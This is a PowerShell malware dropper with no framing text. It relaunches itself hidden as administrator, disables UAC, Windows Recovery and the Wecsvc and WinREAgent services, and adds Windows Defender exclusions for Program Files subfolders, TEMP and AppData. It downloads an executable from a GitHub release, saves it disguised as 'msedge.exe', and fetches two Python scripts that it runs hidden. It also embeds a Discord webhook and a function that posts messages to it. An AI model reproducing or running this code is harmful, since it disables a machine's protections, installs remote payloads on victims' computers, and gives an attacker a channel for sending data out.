$webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'

function Send-WebhookMessage {
    param($Message)
    $body = @{ content = $Message } | ConvertTo-Json -Depth 10
    try {
        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

try {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if (-not $isAdmin) {
        try {
            Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden -ErrorAction Stop
            exit
        } catch {}
    }

    if ($isAdmin) {
        try {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop | Out-Null
            & reagentc /disable | Out-Null
            Stop-Service -Name "Wecsvc" -Force -ErrorAction Stop | Out-Null
            Set-Service -Name "Wecsvc" -StartupType Disabled -ErrorAction Stop | Out-Null
            if (Get-Service -Name "WinREAgent" -ErrorAction SilentlyContinue) {
                Stop-Service -Name "WinREAgent" -Force -ErrorAction Stop | Out-Null
                Set-Service -Name "WinREAgent" -StartupType Disabled -ErrorAction Stop | Out-Null
            }
        } catch {}
    }

    $programFiles = "C:\Program Files"
    $tempFolder = $env:TEMP
    $appDataFolder = $env:APPDATA
    $localAppDataFolder = $env:LOCALAPPDATA

    $directories = Get-ChildItem -Path $programFiles -Directory | Where-Object { $_.Name -notlike "Windows*" }
    $exclusionsAdded = $true
    foreach ($dir in $directories) {
        try {
            Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
        } catch {
            $exclusionsAdded = $false
        }
    }

    try {
        Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
    } catch {
        $exclusionsAdded = $false
    }

    try {
        Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
    } catch {
        $exclusionsAdded = $false
    }

    try {
        Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
    } catch {
        $exclusionsAdded = $false
    }

    if ($exclusionsAdded -and $directories) {
        $randomDir = $directories | Get-Random
        $destinationPath = Join-Path -Path $randomDir.FullName -ChildPath "msedge.exe"
        try {
            Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
        } catch {}

        $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
        try {
            Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -UseBasicParsing -ErrorAction Stop | Out-Null
        } catch {}
    }

    $pythonUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/1.pyw"
    try {
        $response = Invoke-WebRequest -Uri $pythonUrl -UseBasicParsing -ErrorAction Stop
        $pythonCode = [System.Text.Encoding]::UTF8.GetString($response.Content)
        
        $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
        $pythonExists = $null -ne (Get-Command "python.exe" -ErrorAction SilentlyContinue)
        
        if ($pythonwExists) {
            try {
                Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
            } catch {
                if ($pythonExists) {
                    try {
                        Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
                    } catch {}
                }
            }
        } elseif ($pythonExists) {
            try {
                Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
            } catch {}
        }
    } catch {}

    $toolsUrl = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/toolhandler.py"
    try {
        $response = Invoke-WebRequest -Uri $toolsUrl -UseBasicParsing -ErrorAction Stop
        $pythonCode = [System.Text.Encoding]::UTF8.GetString($response.Content)
        
        $pythonwExists = $null -ne (Get-Command "pythonw.exe" -ErrorAction SilentlyContinue)
        $pythonExists = $null -ne (Get-Command "python.exe" -ErrorAction SilentlyContinue)
        
        if ($pythonwExists) {
            try {
                Start-Process pythonw.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
            } catch {
                if ($pythonExists) {
                    try {
                        Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
                    } catch {}
                }
            }
        } elseif ($pythonExists) {
            try {
                Start-Process python.exe -ArgumentList "-c", $pythonCode -WindowStyle Hidden -ErrorAction Stop | Out-Null
            } catch {}
        }
    } catch {}
} catch {}
